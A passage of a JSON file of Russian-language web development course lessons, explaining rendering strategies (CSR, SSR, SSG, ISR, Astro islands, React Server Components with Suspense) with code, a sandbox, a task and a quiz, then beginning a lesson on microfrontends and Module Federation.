      "rendering",
      "ssr",
      "ssg",
      "isr",
      "hydration",
      "islands-architecture",
      "rsc",
      "react-server-components",
      "streaming",
      "nextjs",
      "astro"
    ],
    "theory": {
      "overview": "Как браузер получает и отображает веб-приложение — это ключевое архитектурное решение, определяющее скорость загрузки (**LCP/FCP**), стоимость инфраструктуры, индексацию поисковыми роботами (**SEO**) и отзывчивость интерфейса (**INP**).\n\nЭпоха классических «толстых» SPA (Client-Side Rendering) уступила место гибридным парадигмам: **Server-Side Rendering (SSR)**, **Static Site Generation (SSG)**, **Incremental Static Regeneration (ISR)**, архитектуре островов (**Islands Architecture в Astro**) и революции **React Server Components (RSC)**.\n\nВ этом уроке мы разберём каждую стратегию до мельчайших деталей.",
      "sections": [
        {
          "title": "4 Классические стратегии: CSR, SSR, SSG и ISR",
          "content": "Сравнение архитектурных подходов к генерации HTML:\n\n1. **CSR (Client-Side Rendering — Классический SPA на Vite/CRA)**:\n- Сервер отдает пустой `<div id=\"root\"></div>` и ссылку на тяжелый JS-бандл (1–3 МБ).\n- Браузер качает JS, выполняет его, делает запросы к API и рендерит DOM.\n- **Минусы**: долгий белый экран на мобилках (медленный FCP/LCP), поисковые роботы могут не проиндексировать контент.\n\n2. **SSR (Server-Side Rendering — Next.js / Remix / Nuxt)**:\n- Сервер генерирует готовый HTML на **КАЖДЫЙ входящий HTTP-запрос** пользователя, обращаясь к базе данных на лету.\n- **Плюсы**: мгновенный первый показ контента (быстрый FCP), идеальный SEO и динамические Open Graph превью.\n- **Минусы**: нагрузка на Node.js сервер, задержка TTFB (Time to First Byte) при медленном бэкенде.\n\n3. **SSG (Static Site Generation)**:\n- Страницы генерируются один раз во время сборки проекта (`npm run build`) и выкладываются на глобальный CDN (Cloudflare, Vercel).\n- **Плюсы**: мгновенная отдача (TTFB 10–30 мс), нулевая нагрузка на сервер, 100/100 в Lighthouse.\n- **Минусы**: при изменении одной статьи в блоге требуется полная пересборка всего сайта.\n\n4. **ISR (Incremental Static Regeneration — Next.js)**:\n- Статические страницы с **фоновой регенерацией по таймеру** (`revalidate: 60`).\n- Пользователь мгновенно получает страницу из CDN-кэша, а сервер тихо в фоне обновляет страницу при устаревании.",
          "image": {
            "src": "/images/lessons/web-rendering-strategies.svg",
            "alt": "Парадигмы рендеринга: CSR, SSR, SSG, ISR, Islands Architecture и RSC",
            "caption": "Эволюция рендеринга: CSR (SPA) → SSR/SSG/ISR → Проблема гидратации → Islands Architecture → React Server Components (RSC)"
          },
          "codeExample": {
            "language": "typescript",
            "code": "// Пример конфигурации стратегий рендеринга в Next.js App Router:\n\n// 1. SSG (Статическая генерация по умолчанию)\nexport async function generateStaticParams() {\n  const posts = await getPosts();\n  return posts.map((post) => ({ id: post.id }));\n}\n\n// 2. ISR (Регенерация статики каждые 60 секунд)\nexport const revalidate = 60;\n\n// 3. SSR (Динамический рендеринг на каждый запрос)\nexport const dynamic = 'force-dynamic';\n\nexport default async function ProductPage({ params }: { params: { id: string } }) {\n  // Прямой запрос к базе данных прямо внутри компонента!\n  const product = await db.product.findUnique({ where: { id: params.id } });\n  return <div><h1>{product.title}</h1><span>{product.price} ₽</span></div>;\n}",
            "title": "Декларативное переключение между SSG, ISR и SSR в Next.js",
            "explanation": "В современных фреймворках стратегия рендеринга настраивается для каждого маршрута отдельно."
          }
        },
        {
          "title": "Проблема стоимости гидратации (Hydration Cost & Double Data Fetching)",
          "content": "Почему классический SSR не решил проблему производительности полностью:\n\n1. **Что такое Гидратация (Hydration)**:\n- Сервер отправил пользователю готовый HTML. Пользователь видит картинку и текст.\n- Но кнопки **НЕ РАБОТАЮТ**, пока браузер не скачает весь React-бандл (весь код компонентов) и не «оживит» HTML, сопоставив виртуальный DOM с реальным и навесив слушатели `onClick`!\n- Период между показом HTML и окончанием гидратации называется «Uncanny Valley» (Зловещая долина): интерфейс выглядит готовым, но клики игнорируются.\n\n2. **Проблема двойной передачи данных (Double Data Fetching)**:\n- Чтобы клиентский React смог гидрировать страницу без ошибок, сервер вынужден отправлять данные **ДВАЖДЫ**: один раз в виде готового HTML, а второй раз — в виде огромного JSON-скрипта `<script id=\"__NEXT_DATA__\">` внизу страницы, удваивая размер ответа!",
          "codeExample": {
            "language": "html",
            "code": "<!-- Как выглядит HTML страница с проблемой двойных данных в классическом SSR: -->\n<html>\n  <body>\n    <!-- 1. Первый раз: Данные отрендерены в HTML тегах (50 KB) -->\n    <div id=\"root\">\n      <h1>Курс: Advanced TypeScript</h1>\n      <p>Полное руководство по дженерикам...</p>\n    </div>\n\n    <!-- 2. Второй раз: ТЕ ЖЕ САМЫЕ данные сериализованы в JSON для гидратации (50 KB!) -->\n    <script id=\"__NEXT_DATA__\" type=\"application/json\">\n      {\"props\":{\"pageProps\":{\"course\":{\"title\":\"Advanced TypeScript\",\"desc\":\"Полное руководство...\"}}}}\n    </script>\n    <!-- 3. Клиентский бандл React для гидратации (150 KB) -->\n    <script src=\"/bundle.js\"></script>\n  </body>\n</html>",
            "title": "Проблема Double Data Fetching: дублирование данных в HTML и JSON",
            "explanation": "Классический SSR вынужден передавать одни и те же данные дважды, чтобы клиентский React мог пройти гидратацию."
          }
        },
        {
          "title": "Архитектура островов (Islands Architecture в Astro)",
          "content": "Революционное решение проблемы гидратации от команды Astro:\n\n1. **Концепция Островов (Islands)**:\n- 90–95% типичной веб-страницы (шапка, футер, статьи, боковые панели, текст) — это **статический контент**, которому вообще не нужен JavaScript!\n- Вся страница отгружается браузеру как **чистый HTML (0 КБ JavaScript)**.\n\n2. **Изолированная гидратация (Partial Hydration)**:\n- Только интерактивные островки (кнопка переключения темы, корзина, поле поиска) загружают свой маленький JS-код изолированно.\n\n3. Директивы загрузки островков:\n- `client:load` — гидрировать немедленно при загрузке страницы.\n- `client:visible` — загрузить JS **только тогда, когда пользователь доскроллит** до этого блока (Lazy Hydration)!\n- `client:idle` — гидрировать в моменты простоя браузера (`requestIdleCallback`).",
          "codeExample": {
            "language": "html",
            "code": "--- // Astro компонент страницы блога\nimport Header from '../components/Header.astro'; // 0 КБ JS (чистый HTML)\nimport ArticleContent from '../components/ArticleContent.astro'; // 0 КБ JS\nimport InteractiveComments from '../components/Comments.tsx'; // React компонент!\nimport ThemeToggle from '../components/ThemeToggle.tsx';\n---\n\n<html>\n  <body>\n    <!-- Статический HTML без единого байта JS -->\n    <Header>\n      <!-- Островок 1: гидрируется сразу для быстрого переключения темы -->\n      <ThemeToggle client:load />\n    </Header>\n    \n    <ArticleContent />\n    \n    <!-- Островок 2: JS для комментариев скачается ТОЛЬКО когда пользователь доскроллит до низа! -->\n    <InteractiveComments client:visible />\n  </body>\n</html>",
            "title": "Astro Islands: чистый HTML со точечными островками client:visible",
            "explanation": "95% страницы не содержат JavaScript, а тяжелый виджет комментариев гидрируется только при появлении в зоне видимости."
          }
        },
        {
          "title": "React Server Components (RSC) и Потоковый Стриминг HTML (Suspense)",
          "content": "Новая фундаментальная парадигма современного React (Next.js App Router):\n\n1. **React Server Components (RSC — Серверные компоненты)**:\n- По умолчанию в App Router ВСЕ компоненты являются серверными (`Server Components`).\n- Они выполняются **ИСКЛЮЧИТЕЛЬНО на сервере Node.js**.\n- **Их код НИКОГДА не попадает в клиентский бандл (0 КБ JS!)**.\n- Могут напрямую делать SQL-запросы к базе данных, читать файлы с диска, использовать тяжелые библиотеки без раздувания клиентского бандла.\n\n2. **Клиентские компоненты (`'use client'`)**:\n- Нужны ТОЛЬКО тогда, когда требуется интерактивность браузера: хуки `useState`, `useEffect`, слушатели `onClick`, `onChange`, Web APIs (`localStorage`, `window`).\n\n3. **Потоковый стриминг HTML через `<Suspense>`**:\n- Сервер мгновенно отправляет каркас страницы (Navigation, Layout), а тяжелые медленные блоки (например, аналитику или список рекомендаций) стримит по мере готовности через HTTP Streaming chunked transfer.",
          "codeExample": {
            "language": "typescript",
            "code": "// app/dashboard/page.tsx — Серверный компонент со стримингом через Suspense\nimport { Suspense } from 'react';\nimport { FastHeader } from './FastHeader'; // Server Component (0 КБ JS)\nimport { SlowAnalyticsWidget } from './SlowAnalyticsWidget';\nimport { SkeletonLoader } from '@/shared/ui/Skeleton';\nimport { InteractiveFilter } from './InteractiveFilter'; // 'use client' компонент\n\nexport default function DashboardPage() {\n  return (\n    <main className=\"dashboard-layout\">\n      {/* 1. Отправляется клиенту мгновенно за 15 мс */}\n      <FastHeader title=\"Панель управления\" />\n      \n      {/* 2. Клиентский интерактивный фильтр с хуками useState */}\n      <InteractiveFilter />\n      \n      {/* 3. Медленный блок: пользователь видит скелетон, пока сервер делает тяжелый SQL-запрос */}\n      <Suspense fallback={<SkeletonLoader />}>\n        <SlowAnalyticsWidget />\n      </Suspense>\n    </main>\n  );\n}",
            "title": "Next.js App Router: совмещение RSC, 'use client' и Suspense Streaming",
            "explanation": "Пользователь видит интерфейс мгновенно без блокировки медленными сетевыми запросами благодаря Suspense Streaming."
          }
        }
      ],
      "seniorTips": [
        "Выбирайте стратегию под задачу: для блогов и лендингов — SSG/Astro (0 КБ JS), для маркетплейсов — ISR/Next.js (кеш + ревалидация), для закрытых админок — классический CSR на Vite.",
        "В Next.js App Router держите компоненты серверными (Server Components) по умолчанию и добавляйте директиву `'use client'` только на самых «листьях» дерева компонентов, где нужны `useState` или `onClick`.",
        "Используйте `<Suspense>` для медленных данных — потоковый HTML-стриминг позволяет отдать пользователю готовый лейаут за 20 мс, не дожидаясь ответа медленных микросервисов.",
        "Для минимизации стоимости гидратации выносите тяжелые неинтерактивные библиотеки (markdown парсеры, форматирование дат) в Server Components."
      ],
      "commonMistakes": [
        {
          "bad": "// Проставление 'use client' в самом верху страницы app/layout.tsx\n// Превращает все приложение обратно в старый тяжелый CSR с потерей всех преимуществ RSC!",
          "good": "// 'use client' ставится только на конкретную интерактивную кнопку или форму",
          "reason": "'use client' создает границу, ниже которой весь код попадает в клиентский JavaScript-бандл."
        },
        {
          "bad": "// Использование window или localStorage напрямую в теле Server Component\n// Ошибка: ReferenceError: window is not defined на сервере Node.js!",
          "good": "// Вызов window только внутри useEffect или клиентских компонентов 'use client'",
          "reason": "Серверные компоненты исполняются в среде Node.js/Edge, где нет глобальных объектов браузера window и document."
        },
        {
          "bad": "// Использование чистого CSR (SPA) для интернет-магазина с 50 000 товаров (потеря 90% поискового трафика Google)",
          "good": "// Использование ISR / SSR для каталога товаров с автоматической генерацией sitemap",
          "reason": "Поисковые роботы индексируют статический HTML на порядок быстрее и надежнее, чем сложные JS-бандлы."
        }
      ],
      "keyTakeaways": [
        "CSR отдает пустой HTML, SSR генерирует HTML на запрос, SSG запекает статику на билде, ISR обновляет статику в фоне.",
        "Гидратация требует скачивания JS и сопоставления виртуального DOM с реальным.",
        "Islands Architecture (Astro) отгружает 95% чистого HTML, гидрируя только изолированные интерактивные островки.",
        "React Server Components (RSC) имеют 0 байт в клиентском бандле и обращаются к БД напрямую.",
        "Suspense Streaming отдает каркас страницы мгновенно, догружая тяжелые блоки потоком."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"rendering-app\">\n  <h3>Симулятор стратегий рендеринга</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px;\">\n    <button id=\"btn-csr\" style=\"background:#f85149; color:#fff; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">1. CSR (SPA)</button>\n    <button id=\"btn-ssr\" style=\"background:#ffb02e; color:#0a0e13; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">2. SSR</button>\n    <button id=\"btn-ssg\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">3. SSG (CDN)</button>\n    <button id=\"btn-rsc\" style=\"background:#29e7ff; color:#0a0e13; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">4. RSC (0 KB JS)</button>\n  </div>\n  <pre id=\"render-log\" style=\"color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px;\"></pre>\n</div>",
      "initialCss": "#rendering-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const log = document.getElementById('render-log');\n\ndocument.getElementById('btn-csr').onclick = () => {\n  log.style.color = '#f85149';\n  log.textContent = '⏳ CSR (Client-Side Rendering):\\n1. Сервер отдал пустой <div id=\"root\"></div> (2 KB)\\n2. Загрузка app.bundle.js (1.8 MB) — 800ms\\n3. Парсинг JS + запрос к API — 400ms\\n🔴 LCP: 1450ms | Клиентский JS: 1800 KB | SEO: Сложно';\n};\n\ndocument.getElementById('btn-ssr').onclick = () => {\n  log.style.color = '#ffb02e';\n  log.textContent = '⚡ SSR (Server-Side Rendering):\\n1. Сервер сделал SQL запрос и собрал HTML — 120ms\\n2. Браузер получил полный HTML с контентом (FCP: 150ms)\\n3. Гидратация React бандлом (TTI: 500ms)\\n🟡 LCP: 350ms | Клиентский JS: 220 KB | SEO: Идеально';\n};\n\ndocument.getElementById('btn-ssg').onclick = () => {\n  log.style.color = '#2dff8a';\n  log.textContent = '🚀 SSG (Static Site Generation):\\n1. Отдача готового HTML с ближайшего Edge CDN — 15ms!\\n2. Контент доступен мгновенно\\n🟢 LCP: 120ms | TTFB: 15ms | Нагрузка на сервер: 0% ⚡';\n};\n\ndocument.getElementById('btn-rsc').onclick = () => {\n  log.style.color = '#29e7ff';\n  log.textContent = '💎 RSC (React Server Components):\\n1. Сервер отдал готовый HTML + RSC Payload\\n2. Тяжелые библиотеки (Markdown, SQL) остались на сервере\\n3. Клиент скачал только интерактивную кнопку (3 KB!)\\n🟢 Клиентский JS: 3 KB вместо 1800 KB (Экономия 99.8%)!';\n};",
      "instructions": "Практика со стратегиями рендеринга:\n1. Нажимайте кнопки 1–4 для сравнения таймингов LCP, веса JS-бандла и нагрузки на сервер\n2. Оцените, почему RSC и SSG обеспечивают максимальный показатель Lighthouse 100/100"
    },
    "task": {
      "title": "Проектирование гибридной архитектуры рендеринга интернет-магазина (SSG + ISR + RSC)",
      "scenario": "Спроектируйте архитектуру рендеринга для интернет-магазина на Next.js App Router: главная страница (SSG), каталог товаров (ISR с revalidate: 120), карточка товара (RSC серверный компонент с прямым запросом к БД и потоковым стримингом отзывов через Suspense) и интерактивная кнопка добавления в корзину ('use client').",
      "criteria": [
        "Карточка товара является Server Component без передачи лишнего JS на клиент",
        "Кнопка AddToCart выделена в отдельный клиентский компонент с директивой 'use client'",
        "Блок отзывов обернут в <Suspense fallback={<ReviewsSkeleton />}> для стриминга",
        "Определены стратегии кэширования и ревалидации (revalidate)"
      ],
      "starterCode": {
        "js": "// Спроектируйте структуру компонентов и стратегий рендеринга\n// Ваш код"
      },
      "hints": [
        "В клиентском файле: 'use client'; export const AddToCartBtn = ...",
        "В серверной странице: export const revalidate = 120;",
        "<Suspense fallback={<ReviewsSkeleton />}><ReviewsSection productId={id} /></Suspense>"
      ],
      "solution": {
        "js": "// 1. components/AddToCartBtn.tsx — Клиентский компонент ('use client')\n'use client';\nimport { useState } from 'react';\n\nexport function AddToCartBtn({ productId }: { productId: string }) {\n  const [isAdded, setIsAdded] = useState(false);\n  return (\n    <button onClick={() => setIsAdded(true)} className=\"btn-cart\">\n      {isAdded ? '✓ В корзине' : 'Добавить в корзину'}\n    </button>\n  );\n}\n\n// 2. app/products/[id]/page.tsx — Серверный компонент (RSC) с Suspense\nimport { Suspense } from 'react';\nimport { AddToCartBtn } from '@/components/AddToCartBtn';\n\n// ISR: обновление статики каждые 2 минуты\nexport const revalidate = 120;\n\nexport default async function ProductPage({ params }: { params: { id: string } }) {\n  // Прямой запрос к базе данных на сервере (0 КБ JS в бандле!)\n  const product = await db.product.findById(params.id);\n\n  return (\n    <div className=\"product-container\">\n      <h1>{product.title}</h1>\n      <p>{product.description}</p>\n      <AddToCartBtn productId={product.id} />\n\n      {/* Потоковый стриминг медленного блока отзывов */}\n      <Suspense fallback={<div className=\"skeleton\">Загрузка отзывов...</div>}>\n        <ReviewsWidget productId={params.id} />\n      </Suspense>\n    </div>\n  );\n}",
        "explanation": "Идеальная гибридная архитектура: ISR кэширует страницу на 120 секунд, RSC оставляет тяжелые SQL-запросы на сервере, Suspense стримит отзывы, а 'use client' изолирован в маленькой кнопке."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro15-q1",
          "question": "Серверный компонент импортирует библиотеку разбора Markdown весом 200 КБ. Сколько из неё попадёт в клиентский бандл?",
          "options": [
            "200 КБ: любой импорт в дереве компонентов неизбежно оказывается в сборке",
            "200 КБ, но загрузится отложенно, при первом обращении к этому компоненту",
            "Около половины: библиотека разделяется между серверной и клиентской частями",
            "Ноль: компонент выполняется на сервере, наружу уходит только готовый результат"
          ],
          "correctIndex": 3,
          "explanation": "В этом и главная выгода серверных компонентов: код выполняется на сервере, а браузер получает уже описание готового результата. Тяжёлые неинтерактивные библиотеки — разбор разметки, подсветка кода, работа с датами и обращения к базе — перестают влиять на вес приложения. Граница проходит по директиве клиентского компонента: всё, что ниже неё, снова попадает в бандл."
        },
        {
          "id": "pro15-q2",
          "question": "Что происходит при гидратации и почему её называют платой за серверный рендеринг?",
          "options": [
            "Разметка пересобирается заново, а полученный с сервера HTML полностью отбрасывается",
            "Сервер повторно запрашивает данные, дублируя работу, уже выполненную на клиенте",
            "Браузер качает бандл и навешивает обработчики: до этого страница видна, но не реагирует",
            "Стили пересчитываются с нуля, из-за чего происходит заметный сдвиг макета"
          ],
          "correctIndex": 2,
          "explanation": "Серверный рендеринг быстро даёт картинку, но эта картинка мертва: обработчики ещё не навешаны. Браузер должен скачать бандл, выполнить его и сопоставить построенное дерево с существующей разметкой. В этом промежутке пользователь видит кнопку и жмёт на неё без всякого эффекта — именно это портит метрику отзывчивости на тяжёлых страницах. Архитектура островов и серверные компоненты как раз и уменьшают объём кода, который нужно оживлять."
        },
        {
          "id": "pro15-q3",
          "question": "В чём состоит идея архитектуры островов?",
          "options": [
            "Страница отдаётся статическим HTML, а скрипты получают только интерактивные блоки",
            "Приложение делится на независимые сборки, которые разрабатываются разными командами",
            "Данные загружаются частями, каждая из которых отрисовывается отдельным запросом",
            "Каждый блок страницы изолируется в собственном фрейме со своей областью видимости"
          ],
          "correctIndex": 0,
          "explanation": "Большая часть типичной страницы — текст, заголовки, картинки, подвал — интерактивности не требует вовсе, а классический подход всё равно оживляет дерево целиком. Здесь же по умолчанию отдаётся чистая разметка без единого килобайта скриптов, а оживляются лишь помеченные виджеты: поиск, галерея, форма. Загрузку каждого такого острова можно отложить до появления на экране. Разделение на независимые сборки — это уже про микрофронтенды."
        },
        {
          "id": "pro15-q4",
          "question": "Чем инкрементальная регенерация статики отличается от обычной генерации на этапе сборки?",
          "options": [
            "Страница генерируется заново при каждом запросе, кеш при этом не используется",
            "Статика обновляется только при новом развёртывании всего проекта целиком",
            "Страница собирается на клиенте, а сервер отдаёт лишь пустую оболочку документа",
            "Страница остаётся статической, но пересобирается в фоне по истечении заданного срока"
          ],
          "correctIndex": 3,
          "explanation": "Обычная статика прекрасна по скорости, но данные в ней замораживаются до следующей сборки — для каталога на десять тысяч товаров это неприемлемо. Инкрементальный вариант сохраняет мгновенную отдачу из кеша, но после истечения срока первый пришедший пользователь получает старую версию, а сервер тем временем тихо пересобирает эту одну страницу. Полная пересборка проекта не требуется."
        },
        {
          "id": "pro15-q5",
          "question": "На странице есть быстрый заголовок и медленный блок рекомендаций. Что даёт оборачивание блока в `Suspense`?",
          "options": [
            "Блок закешируется отдельно и при следующем визите пользователя отдастся мгновенно",
            "Блок перестанет отрисовываться на сервере и целиком уйдёт на клиентскую сторону",
            "Запрос рекомендаций выполнится параллельно с остальными и ускорит общий ответ",
            "Сервер отдаст каркас сразу, а содержимое блока дошлёт в том же ответе по готовности"
          ],
          "correctIndex": 3,
          "explanation": "Без такой границы сервер обязан дождаться самых медленных данных, прежде чем отправить хоть байт, и пользователь смотрит на белый экран. С ней ответ начинается немедленно: приходит каркас с заглушкой на месте блока, соединение остаётся открытым, и как только медленный запрос завершится, готовый кусок дошлётся тем же потоком и встанет на место. Один медленный сервис перестаёт задерживать всю страницу."
        }
      ]
    }
  },
  {
    "id": "pro-16",
    "moduleId": "pro",
    "level": 16,
    "title": "Микрофронтенды: Архитектура, Module Federation, Single-SPA и iFrames",
    "subtitle": "Монолит vs MFE, Webpack/Vite Module Federation (Host & Remote), Shared Singletons, изоляция стилей и Error Boundaries",
    "description": "Освойте масштабирование крупных enterprise-систем через микрофронтенды (Microfrontends): сравнение монолита и MFE, 4 подхода интеграции (iFrames, Web Components, build-time, runtime Module Federation), настройку Host Shell и Remote контейнеров, разделяемые зависимости (Shared Singleton React), изолированные Error Boundaries и межмодульную коммуникацию.",
    "estimatedMinutes": 75,
    "difficulty": "advanced",
    "tags": [
      "microfrontends",
      "module-federation",
      "single-spa",
      "mfe",
      "webpack-module-federation",
      "vite-federation",
      "architecture",
      "enterprise",
      "scalability"
    ],
    "theory": {
      "overview": "Когда над одним веб-приложением работают 50–200 разработчиков, классический фронтенд-монолит становится главным тормозом бизнеса: гигантский репозиторий, бесконечные конфликты мержа в `main`, 40-минутный пайплайн CI/CD и страх того, что баг в корзине уронит весь портал.\n\n**Микрофронтенды (Microfrontends — MFE)** переносят идеи микросервисной архитектуры во фронтенд: разбивают единый UI на автономные модули (Каталог, Оплата, Личный кабинет), которые разрабатываются, тестируются и **деплоятся независимыми командами по 10 раз в день** без пересборки всего сайта.\n\nВ этом уроке мы разберём революционную технологию **Module Federation**, устройство Host/Remote контейнеров и изоляцию сбоев.",
      "sections": [
        {
          "title": "Проблема монолита и 4 подхода к реализации микрофронтендов",
          "content": "Эволюция архитектуры крупномасштабных веб-приложений:\n\n1. **Проблемы фронтенд-монолита в Enterprise**:\n- **Связанность релизов**: Команда А не может задеплоить правку текста, пока Команда Б чинит упавший тест в другом разделе.\n- **Огромный бандл**: время сборки и прогона тестов растет до десятков минут.\n- **Технологическая заблокированность**: невозможно обновить React 17 до React 19 частями — только переписыванием всего проекта целиком.\n\n2. **4 Подхода к реализации микрофронтендов**:\n- **1. iFrames (Песочница)**: полная изоляция JS и CSS. Минусы: проблемы с отзывчивостью, модальными окнами за пределами фрейма, медленная загрузка нескольких экземпляров браузера, сложная синхронизация URL.\n- **2. Build-time интеграция (npm-пакеты)**: модули публикуются в npm. Минус: при обновлении пакета нужно пересобирать и передеплоить ВСЁ главное приложение (это не дает независимости релизов!).\n- **3. Web Components (Custom Elements / Shadow DOM)**: нативная браузерная изоляция через Shadow DOM. Хорошо для независимых виджетов.\n- **4. Runtime Module Federation (Современный стандарт ⚡)**: динамическая загрузка скомпилированных JS-модулей прямо в рантайме браузера с общим использованием библиотек (Shared React).",
          "image": {
            "src": "/images/lessons/web-microfrontends-federation.svg",
            "alt": "Микрофронтенды: Монолит vs MFE, Host/Remote контейнеры и Module Federation",
            "caption": "Архитектура Module Federation: Host Shell монтирует независимые Remote-модули (Каталог, Оплата) с разделяемым React Singleton"
          },
          "codeExample": {
            "language": "typescript",
            "code": "// Архитектурная концепция Host Shell (Главного контейнера):\nimport React, { Suspense } from 'react';\nimport { ErrorBoundary } from '@/shared/ui/ErrorBoundary';\n\n// Динамический импорт удаленного микрофронтенда из другого домена/CDN!\n// @ts-ignore — модуль загружается в рантайме браузера\nconst RemoteCatalog = React.lazy(() => import('catalog_mfe/ProductCatalog'));\nconst RemoteCart = React.lazy(() => import('checkout_mfe/CartWidget'));\n\nexport function AppShell() {\n  return (\n    <div className=\"app-shell-layout\">\n      <header className=\"main-header\">\n        <h1>Супермаркет Онлайн</h1>\n        {/* Микрофронтенд корзины изолирован в ErrorBoundary */}\n        <ErrorBoundary fallback={<div>Корзина временно недоступна</div>}>\n          <Suspense fallback={<div>Загрузка корзины...</div>}>\n            <RemoteCart />\n          </Suspense>\n        </ErrorBoundary>\n      </header>\n      \n      <main>\n        {/* Микрофронтенд каталога */}\n        <ErrorBoundary fallback={<div>Ошибка загрузки каталога</div>}>\n          <Suspense fallback={<div>Загрузка витрины товаров...</div>}>\n            <RemoteCatalog />\n          </Suspense>\n        </ErrorBoundary>\n      </main>\n    </div>\n  );\n}",
            "title": "Host Shell: динамическое монтирование Remote-микрофронтендов с изоляцией ошибок",
            "explanation": "Host Shell загружает удаленные компоненты через React.lazy. ErrorBoundary гарантирует, что падение корзины не сломает витрину каталога."
          }
        },
        {
          "title": "Module Federation: Host vs Remote и Shared Dependencies",
          "content": "Как устроен стандарт Module Federation (Webpack 5 / Vite Federation):\n\n1. **Remote (Удаленный модуль / Поставщик)**:\n- Автономное приложение со своим dev-сервером и CI/CD.\n- В конфиге объявляет свойство `exposes`: перечень компонентов, которые он «экспортирует» наружу (`exposes: { './ProductList': './src/ProductList.tsx' }`).\n- Генерирует маленький входной файл манифеста `remoteEntry.js`.\n\n2. **Host (Оболочка / Потребитель)**:\n- В конфиге указывает адреса удаленных модулей `remotes: { catalog: 'catalog@https://cdn.example.com/remoteEntry.js' }`.\n- Импортирует удаленный код как обычный локальный модуль: `import ProductList from 'catalog/ProductList'`.\n\n3. **Разделяемые зависимости (`shared: { react: { singleton: true } }`)**:\n- Без `shared` каждый микрофронтенд загрузил бы свою копию React (150 КБ × 5 MFE = 750 КБ лишнего веса!).\n- Флаг `singleton: true` гарантирует, что браузер загрузит React ровно **ОДИН РАЗ** и все микрофронтенды будут использовать единый контекст хуков и состояния.",
          "codeExample": {
            "language": "javascript",
            "code": "// 1. remote-catalog/webpack.config.js (Конфиг микрофронтенда каталога)\nconst { ModuleFederationPlugin } = require('webpack').container;\n\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'catalog_mfe', // Уникальное имя микрофронтенда\n      filename: 'remoteEntry.js', // Манифест для загрузки\n      exposes: {\n        './ProductList': './src/components/ProductList.tsx', // Экспортируемый компонент\n        './useProducts': './src/hooks/useProducts.ts',       // Экспортируемый хук\n      },\n      shared: {\n        react: { singleton: true, requiredVersion: '^18.2.0', eager: false },\n        'react-dom': { singleton: true, requiredVersion: '^18.2.0' },\n      },\n    }),\n  ],\n};\n\n// 2. host-app/webpack.config.js (Конфиг главного приложения Shell)\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'host_shell',\n      remotes: {\n        // Подключение манифеста удаленного каталога в рантайме\n        catalog_mfe: 'catalog_mfe@https://catalog.store.dev/remoteEntry.js',\n      },\n      shared: {\n        react: { singleton: true, requiredVersion: '^18.2.0' },\n        'react-dom': { singleton: true, requiredVersion: '^18.2.0' },\n      },\n    }),\n  ],\n};",
            "title": "Конфигурация Module Federation: Exposes, Remotes и Shared React Singleton",
            "explanation": "Remote отдает наружу ProductList через remoteEntry.js, а Host подключает его с единым разделяемым экземпляром React Singleton."
          }
        },
        {
          "title": "Межмодульная коммуникация и изоляция стилей",
          "content": "Как микрофронтенды общаются и не конфликтуют стилями:\n\n1. **Межмодульная коммуникация (Cross-MFE Communication)**:\n- **Слабая связка (Loose Coupling)**: микрофронтенды не должны напрямую вызывать функции друг друга.\n- **Способ 1: Custom Events / PubSub Event Bus** (`window.dispatchEvent(new CustomEvent('cart:add', { detail: product }))`).\n- **Способ 2: URL State** (параметры строки поиска `?productId=123` и hash).\n- **Способ 3: Shared Micro-Store** (легковесный стор на Zustand/EventEmitter, переданный через props или shared dependency).\n\n2. **Изоляция стилей (CSS Isolation)**:\n- Проблема: класс `.btn` из микрофронтенда каталога может случайно перекрасить кнопки в микрофронтенде оформления заказа!\n- **Решения**:\n  1. **CSS Modules** — уникальные хеши классов (`.btn_a1b2c`).\n  2. **Tailwind CSS с уникальным префиксом** (`prefix: 'mfe-catalog-'`).\n  3. **CSS-in-JS (Emotion, Styled Components)** с уникальным `nonce`/`scope`.",
          "codeExample": {
            "language": "typescript",
            "code": "// Безопасный типизированный Event Bus для общения между MFE\nexport interface MfeEventMap {\n  'cart:item_added': { id: string; title: string; price: number };\n  'auth:user_logout': void;\n}\n\nexport const mfeEvents = {\n  emit<K extends keyof MfeEventMap>(event: K, detail: MfeEventMap[K]) {\n    window.dispatchEvent(new CustomEvent(event, { detail }));\n  },\n  \n  listen<K extends keyof MfeEventMap>(event: K, handler: (detail: MfeEventMap[K]) => void) {\n    const listener = (e: Event) => handler((e as CustomEvent).detail);\n    window.addEventListener(event, listener);\n    return () => window.removeEventListener(event, listener); // Функция отписки\n  }\n};\n\n// Использование:\n// В MFE Каталога: mfeEvents.emit('cart:item_added', { id: 'p_1', title: 'MacBook', price: 150000 });\n// В MFE Корзины:  const unsub = mfeEvents.listen('cart:item_added', item => addProduct(item));",
            "title": "Межмодульная коммуникация между независимыми MFE через CustomEvent",
            "explanation": "CustomEvent в объекте window связывает микрофронтенды без жестких зависимостей в коде."
          }
        },
        {
          "title": "Изоляция ошибок (Fault Tolerance) и Canary релизы",
          "content": "Надежность микрофронтендной системы в продакшене:\n\n1. **Изоляция сбоев (Error Boundaries)**:\n- В монолите любая необработанная ошибка `undefined is not a function` роняет всё дерево React и показывает белый экран.\n- В MFE каждый микрофронтенд оборачивается в свой **ErrorBoundary** с локальным fallback-интерфейсом.\n\n2. **Независимый деплой и Canary Releases**:\n- Команда корзины деплоит новую версию `remoteEntry.js` на CDN.\n- Host Shell подтягивает новый файл при следующей перезагрузке страницы **БЕЗ пересборки Host**!\n- Возможность A/B тестирования: отдавать 10% пользователей URL старого MFE, а 90% — нового.",
          "codeExample": {
            "language": "typescript",
